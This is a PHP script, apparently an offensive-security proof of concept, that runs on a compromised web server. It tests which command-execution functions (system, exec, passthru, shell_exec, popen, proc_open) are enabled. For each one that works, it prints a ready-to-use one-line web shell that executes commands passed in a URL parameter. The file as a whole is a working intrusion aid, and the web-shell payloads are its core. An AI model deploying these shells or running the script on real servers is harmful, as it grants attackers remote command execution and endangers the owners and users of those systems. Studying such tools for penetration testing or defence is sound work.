<?php
    // version 0.2
    // You can find me at https://www.twitch.tv/offsecprep
    // this is the barebones version of the script currently in development (essentially a PoC). 
    // I still have a lot of testing to do
    // Updates coming soon
    error_reporting(E_ALL);

    echo "<pre>[*] Starting initial checks\n";

    try {
        ob_start(); 
        $check_system = system("echo system");
        ob_clean();
    } catch(Exception $e) {
        echo "[!] Error trying to execute system()\n";
        echo 'Message: ' .$e->getMessage();
    }

    try {
        $check_exec = exec("echo exec");
    } catch(Exception $e) {
        echo "[!] Error trying to execute exec()\n";
        echo 'Message: ' .$e->getMessage();
    }

    try {
        ob_start();
        passthru("echo pass");
        $check_passthru = ob_get_contents();
        ob_end_clean();
    } catch(Exception $e) {
        echo "[!] Error trying to execute passthru()\n";
        echo 'Message: ' .$e->getMessage();
    }

    try {
        $check_shell_exec = shell_exec("echo shell_exec");
    } catch(Exception $e) {
        echo "[!] Error trying to execute shell_exec()\n";
        echo 'Message: ' .$e->getMessage();
    }

    try {
        $handle = popen('echo popen', 'r');
        $check_popen = fread($handle, 2096);
        pclose($handle);

        // proc_open
        $cwd='/tmp';
        $descriptorspec = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("file", "/tmp/error-output.txt", "a") );

        $process = proc_open("echo proc_open", $descriptorspec, $pipes, $cwd);

        $check_proc_open = stream_get_contents($pipes[1]);
        fclose($pipes[1]);
        // end of proc_open
    } catch(Exception $e) {
        echo "[!] Error trying to execute shell_exec()\n";
        echo 'Message: ' .$e->getMessage();
    }

    echo "[*] Initial checks done\n";
    echo "[*]\n";

    if ($check_system == "system") {
        echo "[*] system() execution successful, you can use the following payloads:\n";
        $payload = '<?php system($_GET[\'cmd\']); ?>';
        echo htmlentities("[*] " . $payload);
        echo "\n[*]\n";
    }
    

    if ($check_exec == "exec") {
        echo "[*] exec() execution successful, you can use the following payloads:\n";
        $payload = '<?php exec($_GET[\'cmd\']); ?>';
        echo htmlentities("[*] " . $payload);
        echo "\n[*]\n";
    }

    $check_passthru = trim(preg_replace('/\s\s+/', ' ', $check_passthru));
    if ($check_passthru == "pass") {
        echo "[*] passthru() execution successful, you can use the following payloads:\n";
        $payload = '<?php passthru($_GET[\'cmd\']); ?>';
        echo htmlentities("[*] " . $payload);
        echo "\n[*]\n";
    }

    $check_shell_exec = trim(preg_replace('/\s\s+/', ' ', $check_shell_exec));
    if ($check_shell_exec == "shell_exec") {
        echo "[*] shell_exec() execution successful, you can use the following payloads:\n";
        $payload = '<?php shell_exec($_GET[\'cmd\']); ?>';
        echo htmlentities("[*] " . $payload);
        echo "\n[*]\n";
    }

    $check_popen = trim(preg_replace('/\s\s+/', ' ', $check_popen));
    if ($check_popen == "popen") {
        echo "[*] popen() execution successful, you can use the following payloads:\n";
        $payload = '<Still looking for a reliable payload, use Google for this one>';
        echo htmlentities("[*] " . $payload);
        echo "\n[*]\n";
    }

    $check_proc_open = trim(preg_replace('/\s\s+/', ' ', $check_proc_open));
    if ($check_proc_open == "proc_open") {
        echo "[*] proc_open() execution successful, you can use the following payloads:\n";
        $payload = '<Still looking for a reliable payload, use Google for this one>';
        echo htmlentities("[*] " . $payload);
        echo "\n[*]\n";
    }
    echo "[*] Checks for pcntl_exec() not yet implemented, but you can use Google and check manally if nothing else is available.\n";
    echo "[*]\n";
    echo "[*] Finished\n</pre>";
?>
